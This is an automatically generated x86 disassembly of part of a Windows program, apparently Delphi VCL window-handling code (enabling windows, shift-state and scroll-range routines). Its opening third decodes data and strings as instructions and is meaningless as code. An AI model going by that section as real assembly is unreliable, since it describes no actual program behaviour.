add [ edx + esi * 4 - 0x666bffbb ] dh
inc ebp
add [ eax - 0x4c ] ch
inc ebp
add [ edi + edi * 2 + 0x45 ] cl
add [ 0x726f4654 ] al
insd
mov eax eax
sbb [ esi + 0x45 ] al
add [ edi ] al
add eax 0x726f4654
insd
sbb [ ebp + 0x45 ] al
add [ eax + 0x5e004544 ] ch
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
mov es [ ebx ]
popad
add [ eax ] al
[ eax ]
rol [ ebx ] cl
mov ah 0xd2
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
outsd
insb
clc
xchg [ ebx ] al
pop ebx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
inc [ esp + edi * 4 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add dh bh
cmp dl dl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] ah
and eax 0x3c0041
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
call sub_458b43
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
aas
inc ebp
add [ eax ] ch
add al [ eax ]
outsd
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
and [ esi + 0x610043 ] cl
add bh bh
sbb dl dl
inc ebx
add [ edx + edx * 8 + 0x43 ] dh
add [ eax + 0x3 ] al
clc
xchg [ ebp ] eax
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
inc esp
jle r-xdata
insb
cwde
pushfd
inc ebx
add [ ecx + eax ] ch
[ eax ]
dec eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
cwde
mov esp 0x10045
add [ eax ] al
add [ eax ] al
add [ eax + 0xff ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
add bh bh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ebx + edi * 2 + 0x45 ] bl
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or eax [ ebx + 0x6c ]
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add [ eax ] al
add [ eax + 0x430b001b ] al
insb
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
xor al 0x45
add [ ecx ] ch
add al [ eax ]
jmp [ eax + ecx * 4 ]
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
popad
outsb
cld
test eax 0x700041
add bh bh
loopne r-xdata
inc ebp
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x7300ffff ] ah
dec ecx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax + 0x44 ] cl
outsb
je r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
add ah ch
add al [ eax ]
[ esp + edi * 4 + 0x10045 ]
add [ eax + 0x43e0 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc esp
aas
inc ebp
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
push eax
mov al [ ebp ]
add [ eax ] al
add [ eax + 0x3 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
sbb eax 0x72541000
popad
outsb
jae r-xdata
adc [ eax ] al
call 0xffffffffc1444882
mov esp 0x10045
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
aam 0x32
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
jl r-xdata
jb r-xdata
insb
outsd
jb r-xdata
jae r-xdata
test eax 0x2ec0041
add bh bh
lodsb [ esi ]
mov esp 0x10045
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
mov [ ebx ] es
outsd
outsb
and [ eax ] eax
push cs
cmpsd [ esi ] [ edi ]
add [ eax ] eax
dec [ ecx + ecx * 2 + 0x10044 ]
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax + ecx * 2 + 0x44 ] bl
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x38ff0001 ] ah
dec eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
popad
insb
jne r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
enter 0x438e 0x0
je r-xdata
add bh bh
in al 0x3
inc esp
add [ ecx ] al
add [ eax ] al
sub_455270
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
push ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 + 0x53e40045 ] ch
inc ebp
add al bh
add al [ eax ]
add al cl
inc ecx
inc ebp
add al dh
0x71ec0041 0x45
mov al [ 0xffffffffc8004573 ]
xor al 0x40
add [ eax + ebx * 4 ] cl
inc ebp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
or [ ebp + eax * 2 ] dh
adc [ edx + 0x44 ] dl
add [ eax + 0x79 ] bh
inc ebp
add [ edi + edi - 0x4193ffbf ] al
inc ebp
add [ esi + esi * 2 ] al
inc ebp
add [ eax ] dl
ja r-xdata
xchg esp eax
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add [ eax - 0x17ffba81 ] cl
xchg edi eax
inc ecx
add [ eax ] ch
mov ebx 0xbd000045
inc ebp
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax + 0x68004447 ] ah
jl r-xdata
push 0x6c00456e
xchg [ ebp ] al
cwde
sbb eax [ eax + eax + 0x30 ]
xchg ebx eax
inc ebp
add [ eax + 0x4c004596 ] dl
xchg ebp eax
inc ebp
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add al cl
xchg edi eax
inc ebp
add [ edx + ebx + 0x470c0044 ] dl
inc esp
add [ esi + ebx * 4 + 0x59000045 ] bh
inc esp
add [ eax - 0x2fffbbbd ] cl
mov bl 0x45
add [ eax + ebp * 2 + 0x45 ] bl
add [ ebx + ebp * 2 ] cl
inc ebp
add [ eax - 0x13ffba5c ] dh
je r-xdata
fadd [ ebx ]
int3
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ebp + edi * 2 + 0x45 ] bl
add al cl
add [ eax + eax - 0x6c ] eax
call 0x68459999
mov ebp 0xbe4c0045
inc ebp
add [ eax + 0xf0045be ] bh
add [ eax + 0x75 ] ch
inc ebp
add [ eax + 0x240045b7 ] dh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
push esp
inc ebp
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
je r-xdata
push esp
inc ebx
jne r-xdata
mov eax 0xf0045be
add [ edx + esi * 4 - 0x666bffbb ] dh
inc ebp
add [ eax - 0x4c ] ch
inc ebp
add [ edi + edi * 2 + 0x45 ] cl
add [ ecx ] cl
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
mov al 0x39
mov al 0xb
mov al 0xc5
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
xor al 0x40
add [ eax ] al
add [ eax + 0xc004554 ] dl
add [ eax ] al
add [ eax - 0x4bffbff0 ] ah
clc
push ebx
inc ebp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add al al
xor al 0x40
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
inc eax
mov eax 0xa8004552
inc esp
inc ebp
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
cmp al 0x10
inc eax
add [ esi + ecx * 4 ] bh
inc ebp
add [ eax - 0x72 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx ] bh
xor al [ eax ]
pop esp
xor al [ eax ]
or [ ebp + ecx * 2 + 0x6f ] dl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0xe800408d
push esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
push ebp
inc ebp
add [ eax ] bh
push ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
push ebp
inc ebp
add [ eax - 0x6c000000 ] ah
and al [ ecx ]
outsb
arpl [ eax - 0x70 ] bp
nop
push esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4553bc
mov edi 0xe4ffbdff
mov esi 0xbf0c0045
inc ebp
add [ edi + edi * 4 - 0x4003ffbb ] ah
inc ebp
add al dl
rol [ ebp ] 0xe8
rol [ ebp ] 0x68
mov ebp 0xbe4c0045
inc ebp
add [ eax + 0xf0045be ] bh
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
push esp
inc ebp
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
je r-xdata
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
xor al 0x40
add [ eax ] al
add [ eax + 0xc004554 ] dl
add [ eax ] al
add [ eax - 0x4bffbff0 ] ah
clc
push ebx
inc ebp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add al al
xor al 0x40
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
inc eax
mov eax 0xa8004552
inc esp
inc ebp
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
cmp al 0x10
inc eax
add [ esi + ecx * 4 ] bh
inc ebp
add [ eax - 0x72 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx ] bh
xor al [ eax ]
pop esp
xor al [ eax ]
or [ ebp + ecx * 2 + 0x6f ] dl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0xe800408d
push esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
push ebp
inc ebp
add [ eax ] bh
push ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
push ebp
inc ebp
add [ eax - 0x6c000000 ] ah
and al [ ecx ]
outsb
arpl [ eax - 0x70 ] bp
nop
push esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_45566c
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_4556b8
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45eeb8
mov eax [ rw-data ]
call sub_419620
mov eax [ rw-data ]
call sub_4195c8
retn
push 0x0
push eax
call ShowOwnedPopups
sub_4556f0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_455740
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_4557e3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_40370c#6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_4556f0
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4557ea
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_4557f4
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026dc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_45582c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_455890
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_45582c
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_4558ec
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_45590c
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_4558ec
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_455938
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_45c498
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45c908
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407c14
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45c484
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45c8f4
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407c14
test eax eax
je r-xdata
sub_4559c0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_455a14
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_455a50
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_455a9c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_455afa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_452ccc
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4041a4
mov eax [ ebp - 0x8 ]
pop edx
call sub_407c14
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455b01
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
sub_455b0c
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_455b34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_455ba5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_455b0c
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455bac
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
sub_455bb4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40323c
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_455c44
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413f84
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_45650c
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4564ec
mov edx [ edi + 0xc ]
mov eax ebx
call sub_45639c
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455c94
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_455e4c
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43e550
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_45639c
xor edx edx
mov eax ebx
call sub_45639c
jmp r-xdata
sub_455ccc
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_423880
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_455d38
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_423880
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_455da0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4564d4
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_441428
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_4564d4
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4413ec
call sub_455d38
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4413ec
call sub_455ccc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_455e4c
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_4446f8
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_455e84
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4446f8
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_455eb8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_455e84
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_455e84
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_455f34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4446f8
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_455eb8
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43d8c8
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_455eb8
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43d90c
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_455fcc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
